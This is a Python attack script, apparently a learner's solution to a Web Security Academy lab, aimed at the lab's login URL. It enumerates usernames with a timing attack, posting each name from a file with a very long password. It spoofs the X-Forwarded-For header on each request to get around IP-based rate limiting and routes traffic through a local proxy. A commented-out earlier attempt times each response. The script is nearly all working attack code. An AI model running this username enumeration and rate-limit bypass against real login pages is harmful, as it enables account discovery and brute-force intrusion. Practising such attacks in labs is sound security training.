import requests 
import urllib3
import time
import itertools

# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0ace003d0353c40b8071dfe900a8003c.web-security-academy.net/login"

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

found = False

# for ip in range(4,100):
#    # a = str(ip) # to convert int to string becuase headers will not accept the int values directly
#     headers = {"X-Forwarded-For": str(ip) }
#     with open("username.txt",'r') as file:
#         for item in file:
#             username_payload=item.strip()
#             data = {"username":username_payload,"password":"passwordllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll_payload"}
#             start = time.time()
#             response = requests.post(url,verify=False,headers=headers,proxies=proxies,data=data)
#             end = time.time()
#             duration = end - start
#             print(f"[{duration:.2f} s] Tried IP: {str(ip)}, Username: {username_payload}") 
#             if "Invalid username or password." not in response.text:
#                 print("username found",username_payload)
#                 found = True
#                 break

   # dout rounak sa puchna hai username kyu nahi aa raha hai correct

password = "longtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenoseelongtimenosee"
usernames =[]
with open("username.txt",'r') as file:
    for item in file:
        usernames.append(item.strip())

ips = []
for i in range(0,len(usernames)):
    ips.append(i)

for (users,ip) in zip(usernames,ips):
    headers = {"X-Forwarded-For": str(ip) }
    data = {"username":users,"password":password}
    print(f"[+] Trying user {users}")
    response = requests.post(url,verify=False,headers=headers,proxies=proxies,data=data)
